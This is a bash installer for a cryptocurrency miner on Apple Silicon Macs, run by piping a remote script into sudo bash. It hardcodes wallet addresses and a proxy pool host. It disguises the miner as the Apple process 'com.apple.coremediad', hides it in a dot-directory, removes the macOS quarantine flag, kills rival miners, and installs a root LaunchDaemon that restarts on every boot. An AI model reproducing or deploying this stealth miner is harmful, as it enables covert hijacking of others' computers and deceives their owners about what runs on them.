#!/usr/bin/env bash
# ============================================================
# mine_gpu.sh — Smart GPU/CPU miner for macOS Apple Silicon
# Auto-detects: GPU (Metal/verusmetal) → CPU (ccminer/xmrig)
# Coins: VRSC, XMR — routed via cdn.snumcaj.com proxy
# Process appears as: "com.apple.coremediad"
# Run: sudo curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_gpu.sh | sudo bash
# ============================================================

# ---- Wallets ----
VRSC_WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
XMR_WALLET="45yWnSbx7c4TzJCf7hwgdHVYmRxZt5Y4g8JVdRjPJuQALzgLMUBwiK7QU2FMeiwMF48APgsi54rBagJvgMo5KUEqAWA2fbg"
WORKER="m2mac"

# ---- CDN Proxy (auto-routes all pools) ----
CDN_HOST="cdn.snumcaj.com"
VRSC_PORT="3956"   # → na.luckpool.net:3956
XMR_PORT="13956"   # → pool.supportxmr.com:3333

# ---- Paths ----
DISGUISE_NAME="com.apple.coremediad"
INSTALL_DIR="/Library/Application Support/.cmgpu"
LOG_PATH="/Library/Logs/${DISGUISE_NAME}.log"
PLIST_PATH="/Library/LaunchDaemons/${DISGUISE_NAME}.plist"  # LaunchDaemon = root = no memory limits

MAX_THREADS=$(sysctl -n hw.logicalcpu)
THREADS=$(( MAX_THREADS * 80 / 100 ))
MACOS_VER=$(sw_vers -productVersion | cut -d. -f1)

if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
  echo "[!] Requires macOS Apple Silicon."
  exit 1
fi
if [[ $EUID -ne 0 ]]; then
  echo "[!] Run with sudo: sudo curl -fsSL ... | sudo bash"
  exit 1
fi

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║     SMART GPU/CPU MINER — Apple Silicon  ║"
echo "╠══════════════════════════════════════════╣"
printf "║  macOS: %-10s  Cores: %-12s   ║\n" "$MACOS_VER" "$MAX_THREADS"
echo "╚══════════════════════════════════════════╝"
echo ""

# ---- Detect best miner ----
MINER_TYPE=""
MINER_BIN=""
COIN=""
POOL_HOST="$CDN_HOST"

echo "[*] Detecting best miner for your system..."

# Check macOS version for verusmetal (requires 26+)
if [[ $MACOS_VER -ge 26 ]]; then
  echo "      → macOS $MACOS_VER detected — verusmetal GPU supported"
  MINER_TYPE="verusmetal"
  COIN="VRSC"
  POOL_PORT="$VRSC_PORT"
elif [[ $MACOS_VER -ge 14 ]]; then
  echo "      → macOS $MACOS_VER — GPU miner not available, using CPU ccminer (VRSC)"
  MINER_TYPE="ccminer"
  COIN="VRSC"
  POOL_PORT="$VRSC_PORT"
fi

echo "      → Selected: $MINER_TYPE mining $COIN via $POOL_HOST:$POOL_PORT"
echo ""

# ---- Thread prompt ----
if [[ -c /dev/tty ]]; then
  echo -n "  CPU threads [1-$MAX_THREADS, Enter=80%($THREADS)]: " > /dev/tty
  read -r USER_THREADS < /dev/tty || USER_THREADS=""
  if [[ "$USER_THREADS" =~ ^[0-9]+$ ]] && [[ "$USER_THREADS" -ge 1 ]] && [[ "$USER_THREADS" -le "$MAX_THREADS" ]]; then
    THREADS=$USER_THREADS
  fi
  echo "  → Using $THREADS / $MAX_THREADS cores"
fi

# ---- Stop old instance ----
echo "[1/5] Cleaning old install..."
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
pkill -9 -f "xmrig" 2>/dev/null || true
pkill -9 -f "ccminer" 2>/dev/null || true
pkill -9 -f "verusmetal" 2>/dev/null || true
launchctl bootout system "$PLIST_PATH" 2>/dev/null || true
rm -rf "$INSTALL_DIR"
rm -f "$PLIST_PATH" "$LOG_PATH"
mkdir -p "$INSTALL_DIR"
echo "      ✓ Clean"

# ---- Download miner ----
echo "[2/5] Downloading $MINER_TYPE for $COIN..."

if [[ "$MINER_TYPE" == "verusmetal" ]]; then
  # verusmetal — Apple Silicon GPU miner
  DL_URL=$(curl -fsSL https://api.github.com/repos/giffeler/verusmetal/releases/latest \
    | python3 -c "import json,sys; d=json.load(sys.stdin); [print(a['browser_download_url']) for a in d.get('assets',[]) if 'arm64' in a['name'].lower() or 'mac' in a['name'].lower()]" 2>/dev/null | head -1)

  if [[ -z "$DL_URL" ]]; then
    # Fallback to known URL
    DL_URL="https://ios.gekko.de/verusmetal/verusmetal-latest-arm64.zip"
  fi

  curl -fsSL "$DL_URL" -o /tmp/verusmetal.zip
  unzip -q /tmp/verusmetal.zip -d "$INSTALL_DIR"
  MINER_BIN=$(find "$INSTALL_DIR" -name "verusmetal" -type f | head -1)
  rm -f /tmp/verusmetal.zip

elif [[ "$MINER_TYPE" == "ccminer" ]]; then
  # Build ccminer from source for VRSC
  if ! command -v brew &>/dev/null; then
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null
  fi
  eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null)"
  brew install automake autoconf openssl@3 </dev/null 2>/dev/null

  OPENSSL_PREFIX="$(brew --prefix openssl@3)"
  export LDFLAGS="-L${OPENSSL_PREFIX}/lib"
  export CPPFLAGS="-I${OPENSSL_PREFIX}/include -I$(brew --prefix)/include"
  export PKG_CONFIG_PATH="${OPENSSL_PREFIX}/lib/pkgconfig"

  BUILD_DIR="$INSTALL_DIR/.build"
  git clone --depth 1 https://github.com/monkins1010/ccminer "$BUILD_DIR" </dev/null
  cd "$BUILD_DIR"
  ./autogen.sh </dev/null 2>&1 | tail -2
  ./configure.sh </dev/null 2>&1 | tail -3

  # Patch for Apple Silicon
  find . -name "Makefile" -exec sed -i '' \
    -e 's/-mfpu=[^ "]*//g' \
    -e 's/-march=armv7[^ "]*//g' \
    -e 's/-mfloat-abi=[^ "]*//g' {} \;

  python3 -c "
with open('miner.h','r') as f: c=f.read()
for s in ['BE16DEC','BE16ENC','LE16DEC','LE16ENC']:
    c=c.replace(f'#if !HAVE_DECL_{s}',f'#if !defined(__APPLE__) && !HAVE_DECL_{s}')
open('miner.h','w').write(c)
"
  curl -fsSL "https://raw.githubusercontent.com/DLTcollab/sse2neon/master/sse2neon.h" \
    -o "$(brew --prefix)/include/sse2neon/sse2neon.h" 2>/dev/null || true
  mkdir -p verus/sse2neon sse2neon
  cp "$(brew --prefix)/include/sse2neon/sse2neon.h" verus/sse2neon/ 2>/dev/null || true
  cp "$(brew --prefix)/include/sse2neon/sse2neon.h" sse2neon/ 2>/dev/null || true

  make -j"$THREADS" 2>/dev/null
  MINER_BIN="$INSTALL_DIR/ccminer"
  [[ -f "$BUILD_DIR/ccminer" ]] && cp "$BUILD_DIR/ccminer" "$MINER_BIN"
fi

if [[ -z "$MINER_BIN" || ! -f "$MINER_BIN" ]]; then
  echo "[!] Miner binary not found — build failed"
  exit 1
fi

cp "$MINER_BIN" "$INSTALL_DIR/$DISGUISE_NAME"
chmod +x "$INSTALL_DIR/$DISGUISE_NAME"
xattr -d com.apple.quarantine "$INSTALL_DIR/$DISGUISE_NAME" 2>/dev/null || true
echo "      ✓ $MINER_TYPE ready"

# ---- Write launch script ----
echo "[3/5] Writing config..."
LAUNCH_SCRIPT="$INSTALL_DIR/launch.sh"

if [[ "$MINER_TYPE" == "verusmetal" ]]; then
  cat > "$LAUNCH_SCRIPT" << SCRIPT
#!/bin/bash
exec "$INSTALL_DIR/$DISGUISE_NAME" \
  -o "stratum+tcp://${POOL_HOST}:${POOL_PORT}" \
  -u "${VRSC_WALLET}.${WORKER}" \
  -p x \
  >> "$LOG_PATH" 2>&1
SCRIPT
elif [[ "$MINER_TYPE" == "ccminer" ]]; then
  cat > "$LAUNCH_SCRIPT" << SCRIPT
#!/bin/bash
exec "$INSTALL_DIR/$DISGUISE_NAME" \
  -a verus \
  -o "stratum+tcp://${POOL_HOST}:${POOL_PORT}" \
  -u "${VRSC_WALLET}.${WORKER}" \
  -p x \
  -t $THREADS \
  >> "$LOG_PATH" 2>&1
SCRIPT
fi
chmod +x "$LAUNCH_SCRIPT"
echo "      ✓ Config written ($MINER_TYPE → $COIN → $POOL_HOST:$POOL_PORT)"

# ---- Install as LaunchDaemon (root, no memory limits) ----
echo "[4/5] Installing LaunchDaemon (root, auto-start on boot)..."
cat > "$PLIST_PATH" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>${DISGUISE_NAME}</string>
  <key>ProgramArguments</key><array>
    <string>/bin/bash</string>
    <string>${LAUNCH_SCRIPT}</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>${LOG_PATH}</string>
  <key>StandardErrorPath</key><string>${LOG_PATH}</string>
</dict></plist>
PLIST

launchctl load -w "$PLIST_PATH"
echo "      ✓ LaunchDaemon installed (runs as root on every boot)"

# ---- Start ----
echo "[5/5] Starting..."
sleep 2

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         MINER RUNNING                    ║"
echo "╠══════════════════════════════════════════╣"
printf "║  Type    : %-30s ║\n" "$MINER_TYPE ($COIN)"
printf "║  Process : %-30s ║\n" "$DISGUISE_NAME"
printf "║  Pool    : %-30s ║\n" "$POOL_HOST:$POOL_PORT"
printf "║  Threads : %-30s ║\n" "$THREADS / $MAX_THREADS"
printf "║  Log     : %-30s ║\n" "$LOG_PATH"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "  Live logs : tail -f \"$LOG_PATH\""
echo "  Stop      : launchctl unload \"$PLIST_PATH\""
echo ""
sleep 3
tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Starting up..."
